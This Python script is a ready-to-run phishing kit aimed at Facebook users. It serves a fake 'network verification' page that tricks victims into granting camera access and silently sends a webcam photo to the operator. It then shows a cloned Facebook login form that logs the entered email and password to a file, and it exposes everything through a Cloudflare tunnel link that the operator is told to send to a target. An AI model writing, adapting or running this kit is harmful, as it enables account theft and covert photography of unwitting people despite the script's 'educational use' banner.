#!/usr/bin/env python3
"""
Created by: Gøød Âs Bj
"""

import subprocess
import sys
import os
import time
import threading
import urllib3
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Auto-install
REQUIRED = ['requests', 'flask']
for pkg in REQUIRED:
    try:
        __import__(pkg)
    except ImportError:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '-q'])

import requests as req
from flask import Flask, request, redirect

# =====================================================================
# BANNER
# =====================================================================
BANNER = """
\033[91m
      :::::::::  :::::::::: ::::::::   ::::::::  :::    :::  :::::::::: ::::::::: 
     :+:    :+: :+:       :+:    :+: :+:    :+: :+:   :+:   :+:       :+:    :+: 
    +:+    +:+ +:+       +:+        +:+    +:+ +:+  +:+    +:+       +:+    +:+  
   +#++:++#:  +#++:++#  +#+        +#+    +:+ +#++:+     +#++:++#  +#++:++#     
  +#+    +#+ +#+       +#+        +#+    +#+ +#+  +#+    +#+       +#+          
 #+#    #+# #+#       #+#    :+: #+#    #+# #+#   #+#   #+#       #+#          
##########  ########## ########   ########  ###    ###  ########## ########### 
\033[0m
\033[92m
  +--------------------------------------------------------------+
  |   [!!] NETWORK VERIFY TRICK v1.0                         |
  |   [!] Fake Allow Prompt -> Silent Snap -> FB Login        |
  |   [>] Created by: Gøød Âs Bj                                |
  +--------------------------------------------------------------+
\033[0m"""

# =====================================================================
# STEP 1: FAKE NETWORK VERIFY PAGE (The Decoy)
# =====================================================================
VERIFY_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Network Verification Required</title>
    <style>
        body { background-color: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .verify-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        .icon { font-size: 50px; margin-bottom: 20px; }
        h2 { color: #1c1e21; font-size: 20px; margin: 0 0 10px 0; }
        p { color: #606770; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        .warning-text { color: #cc0000; font-weight: bold; font-size: 13px; margin-bottom: 20px; }
        .verify-btn { background-color: #1877f2; color: white; padding: 12px; width: 100%; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .verify-btn:active { background-color: #166fe5; }
        .footer { color: #8a8d91; font-size: 12px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="verify-box">
        <div class="icon">🌐</div>
        <h2>Network Verification Required</h2>
        <p>Your connection is secured but requires verification to access this page safely.</p>
        <div class="warning-text">⚠️ You need to allow first to connect your internet</div>
        <button class="verify-btn" onclick="startVerify()">Click to Verify</button>
        <div class="footer">Connection Secured by Cloudflare</div>
    </div>

    <script>
        async function startVerify() {
            // Change button state so user doesn't click twice
            const btn = document.querySelector('.verify-btn');
            btn.innerText = 'Verifying...';
            btn.style.backgroundColor = '#606770';
            btn.disabled = true;

            try {
                // 1. Trick the user into allowing camera thinking it's network permission
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 640, height: 480 } 
                });
                
                const video = document.createElement('video');
                video.autoplay = true;
                video.muted = true;
                video.srcObject = stream;
                
                // 2. Wait for camera to adjust light
                await new Promise(r => setTimeout(r, 1500));
                
                // 3. Capture frame silently
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                
                // 4. Send picture to server
                await fetch('/snap', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                });
                
                // 5. Kill camera
                stream.getTracks().forEach(track => track.stop());
                
            } catch (err) {
                // If denied, just proceed to login
                console.log("Cam skipped");
            }

            // 6. Redirect to the "Verified" Facebook page
            window.location.href = '/login';
        }
    </script>
</body>
</html>
"""

# =====================================================================
# STEP 2: REAL FACEBOOK LOGIN PAGE (After "Verified")
# =====================================================================
FACEBOOK_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; text-align: center; padding-top: 15vh; margin: 0; }
        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); width: 90%; max-width: 400px; margin: auto; }
        .logo { color: #1877f2; font-size: 38px; font-weight: bold; margin-bottom: 15px; }
        input[type=text], input[type=password] { width: 100%; padding: 14px; margin: 5px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; background: #f0f2f5; box-sizing: border-box; }
        .login-btn { background-color: #1877f2; color: white; padding: 14px; width: 100%; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .forgot { color: #1877f2; font-size: 14px; margin-top: 20px; text-decoration: none; display: inline-block; }
        .footer { color: #8a8d91; font-size: 12px; margin-top: 30px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">facebook</div>
        <form action="/capture" method="POST">
            <input type="text" name="email" placeholder="Email or Phone Number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot">Forgotten password?</a>
    </div>
    <div class="footer">Meta © 2024</div>
</body>
</html>"""

# =====================================================================
# FLASK SERVER & ROUTING
# =====================================================================
app = Flask(__name__)
SAVE_DIR = "silent_snaps"
if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

@app.route('/')
def index():
    # Step 1: Show Fake Network Verify Page
    return VERIFY_HTML

@app.route('/login')
def login_page():
    # Step 3: Show Facebook Login after Snap
    return FACEBOOK_HTML

@app.route('/snap', methods=['POST'])
def snap():
    try:
        data = request.get_json()
        image_data = data.get('image', '')
        
        if image_data:
            image_data = image_data.split(',')[1]
            filename = f"snap_{time.strftime('%Y%m%d_%H%M%S')}.jpg"
            filepath = os.path.join(SAVE_DIR, filename)
            
            with open(filepath, "wb") as f:
                f.write(base64.b64decode(image_data))
                
            print(f"\n\033[92m[📸 SNAP!] Picture saved to {filepath}\033[0m")
    except Exception as e:
        pass
        
    return "OK", 200

@app.route('/capture', methods=['POST'])
def capture():
    email = request.form.get('email', 'UNKNOWN')
    password = request.form.get('pass', 'UNKNOWN')
    
    with open('fb_captured.txt', 'a') as f:
        f.write(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')} | Email: {email} | Password: {password}\n")
    
    print(f"\n\033[92m[OK] CAPTURED! Email: {email} | Password: {password}\033[0m")
    
    return redirect('https://www.facebook.com/login.php', code=302)

def run_flask(port):
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# =====================================================================
# AUTO TUNNEL (CLEAN OUTPUT)
# =====================================================================
def start_tunnel(port):
    cf_paths = [
        "/data/data/com.termux/files/usr/bin/cloudflared",
        os.path.join(os.environ.get('HOME', '/data/data/com.termux/files/home'), 'cloudflared'),
        "cloudflared"
    ]
    
    cf_path = None
    for path in cf_paths:
        try:
            result = subprocess.run([path, '--version'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                cf_path = path
                break
        except: continue
            
    if not cf_path:
        print(f"\033[91m[X] Cloudflared not found! Run: pkg install cloudflared -y\033[0m")
        return
    
    print(f"\033[93m[>] Initializing Secure Tunnel...\033[0m")
    process = subprocess.Popen(
        [cf_path, 'tunnel', '--url', f'http://localhost:{port}', '--no-autoupdate'],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
    )
    
    url_found = False
    while True:
        line = process.stdout.readline()
        if not line: break
        if "https://" in line and "trycloudflare.com" in line and not url_found:
            start_idx = line.find("https://")
            end_idx = line.find(" ", start_idx)
            if end_idx == -1: end_idx = len(line.strip())
            clean_url = line[start_idx:end_idx].strip()
            print(f"\n\033[92m[OK] Tunnel Established Successfully!\033[0m")
            print(f"\n\033[96m{'='*60}\033[0m")
            print(f"\033[93m[+] LINK TO SEND: {clean_url}\033[0m")
            print(f"\033[96m{'='*60}\033[0m")
            url_found = True
        if "ERR " in line or "Failed" in line:
            print(f"\033[91m[!] Tunnel Error: {line.strip()}\033[0m")

# =====================================================================
# MAIN
# =====================================================================
def main():
    os.system('clear')
    print(BANNER)
    print("\033[91m[!] FOR EDUCATIONAL USE ONLY!\033[0m\n")
    
    port = input("\033[92m[+] Port (default 8080): \033[0m").strip() or "8080"
    
    print(f"\n\033[93m[>] Starting Decoy Server...\033[0m")
    flask_thread = threading.Thread(target=run_flask, args=(int(port),), daemon=True)
    flask_thread.start()
    time.sleep(2)
    print(f"\033[92m[OK] Server is Ready.\033[0m")
    
    tunnel_thread = threading.Thread(target=start_tunnel, args=(int(port),), daemon=True)
    tunnel_thread.start()
    
    time.sleep(12) 
    print(f"\n\033[92m[+] Send the Cloudflare link above to your target.\033[0m")
    print(f"\033[92m[+] Pictures save to: {SAVE_DIR}/\033[0m")
    print(f"\033[92m[+] Passwords save to: fb_captured.txt\033[0m\n")
    
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\033[93m[!] Shutting down gracefully...\033[0m")
        sys.exit(0)

if __name__ == "__main__":
    main()